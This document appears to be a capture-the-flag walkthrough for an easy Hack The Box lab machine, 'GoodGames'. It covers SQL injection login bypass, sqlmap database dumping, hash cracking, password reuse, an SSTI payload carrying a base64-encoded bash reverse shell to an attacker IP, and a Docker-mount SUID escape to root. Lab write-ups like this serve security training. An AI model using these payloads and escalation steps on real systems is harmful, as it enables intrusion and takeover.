@@ -1,0 +1,148 @@
+                              GoodGames
+
+                              24th January 2022 / Document No. D22.100.154
+                              Prepared By: TheCyberGeek
+                              Machine Author(s): TheCyberGeek
+                              Difficulty: Easy
+
+Classification: Confidential
+
+Synopsis
+
+GoodGames is an Easy linux machine that showcases the importance of sanitising user inputs in
+web applications to prevent SQL injection attacks, using strong hashing algorithms in database
+structures to prevent the extraction and cracking of passwords from a compromised database,
+along with the dangers of password re-use. It also highlights the dangers of using
+render_template_string in a Python web application where user input is reflected, allowing
+Server Side Template Injection (SSTI) attacks. Privilege escalation involves docker hosts
+enumeration and shows how having admin privileges in a container and a low privilege user on
+the host machine can be dangerous, allowing attackers to escalate privileges to compromise the
+system.
+
+Skills Required
+
+      Web Enumeration
+      Basic Web Exploitation Skills
+      Basic Hash Cracking Skills
+      Understanding of Detection & Exploitation of SSTI
+      Understanding of Basic Docker Security Concepts
+
+Skills Learned
+
+Exploiting Union-Based SQL Injections
+Hash Cracking Weak Algorithms
+Password Reuse
+Exploiting SSTI
+Basics of Docker Breakouts
+
+Enumeration
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.130 | grep ^[0-9] | cut -d '/' -f 1
+   | tr '\n' ',' | sed s/,$//)
+   nmap -p$ports -sV -sC -Pn 10.10.11.130
+
+Nmap scan shows that only port 80 hosting a Python 3.9.2 application is listening.
+
+Python Webserver
+
+Browsing to port 80 we see a gaming based website.
+
+The page title is GoodGames and the footer discloses that the site runs on goodgames.htb . Let's
+add this to our hosts file.
+
+   echo "10.10.11.130 goodgames.htb" | sudo tee -a /etc/hosts
+Inspecting the login feature we try a simple SQL injection as part of our basic checks consisting of
+admin' or 1 = 1 -- - and see that we need to enter a valid email address.
+Capture a valid email login request in BurpSuite and manually change the email to the admin'
+or 1 = 1 -- - payload then hit SIGN IN and we see a response welcoming the admin.
+
+SQL Injection
+
+After detecting a valid SQL injection for an authentication bypass, we change the email back to
+admin@goodgames.htb and save the request to a file called goodgames.req . Use SQLMap
+enumerate the database.
+
+   sqlmap -r goodgames.req
+Enumerate the database and tables to identify any sensitive information stored in the database.
+   sqlmap -r goodgames.req --dbs
+
+Enumerate the database named main by extracting the table names.
+   sqlmap -r goodgames.req -D main --tables
+Extract all the data from the user table.
+   sqlmap -r goodgames.req -D main -T user --dump
+
+Disclosed is an admin's password hash. Using CrackStation we can crack the hash.
+Using the cookie from the BurpSuite repeater tab after authenticating as admin we look into the
+admin's account and we see a cog at the top right corner of the page. Clicking the cog redirects us
+to a new subdomain called internal-administration.goodgames.htb . Let's add this subdomain
+to our /etc/hosts file to allow access to the site.
+
+   sudo sed -i 's/goodgames.htb/goodgames.htb internal-
+   administration.goodgames.htb/g' /etc/hosts
+When visiting the new subdomain we see a Flask Dashboard login page.
+It is possible that the administrator has re-used their credentials for this application as well.
+Entering the username admin and the password superadministrator successfully authenticates
+us to the application.
+
+SSTI
+
+Navigating to the settings page we notice that we can edit our user details. As this is a Python
+Flask application this would be a good time to test the form for Server Side Template Injection.
+After changing our username to {{7*7}} we see that our username has been changed to 49
+and our SSTI payload was executed.
+At this stage we know the site is vulnerable to SSTI so we can inject a payload and get a shell. First
+we base64 encode our payload, then start a listener locally.
+
+   echo -ne 'bash -i >& /dev/tcp/10.10.14.25/4444 0>&1' | base64
+   YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNS80NDQ0IDA+JjE=
+   nc -lvvp 4444
+Then we construct a basic SSTI payload to deliver on site through the name field.
+   {{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZG
+   V2L3RjcC8xMC4xMC4xNC4yMy80NDQ0IDA+JjE=${IFS}|base64${IFS}-d|bash').read()}}
+
+We can now go into the user directory and access the flag.
+
+Privilege Escalation via Docker Escape
+
+After getting a shell on the system, we quickly notice that we are in a Docker container.
+A directory list of user augustus home directory shows that instead of their name, the UID 1000
+is displayed as the owner for the available files and folders. This hints that the user's home
+directory is mounted inside the docker container from the main system. Checking mount we see
+that the user directory from the host is indeed mounted with read/write flag enabled.
+
+Enumeration of the available network adapters shows that the container IP is 172.19.0.2 .
+Docker usually assigns the first address of the subnet to the host system in default configurations,
+so 172.19.0.2 might be the internal Docker IP address of the host .
+Let's scan the host at 172.19.0.1 to see what ports are available as part of the basic checks for
+lateral movement. As nmap is not installed we can use Bash instead.
+
+   for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT
+   &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
+
+We find that SSH is listening internally. We attempt to password reuse on both root and
+augustus accounts.
+This is successful and we log in as Augustus.
+
+With knowledge that the user directory is mounted in the Docker container, we can write files in
+the Host and change their permissions to root from within the container. These new permissions
+will be reflected to the Host system as well.
+
+Copy bash to the user directory as augustus which we are already authenticated as on the host
+machine, then exit out of the SSH session. Change the ownership of the bash executable to
+root:root (owned by root and in root group) from within the Docker container and apply the
+SUID permissions to it.
+
+   # As augustus on host machine
+   cp /bin/bash .
+   exit
+
+   # As root in the docker container
+   chown root:root bash
+   chmod 4755 bash
+SSH back into augustus user on the host machine and check the permissions of the bash
+executable.
+
+The permissions are reflected on the host system and the duplicate Bash now has SUID
+permissions. Execute ./bash -p and spawn a shell with the effective UID of root.
+
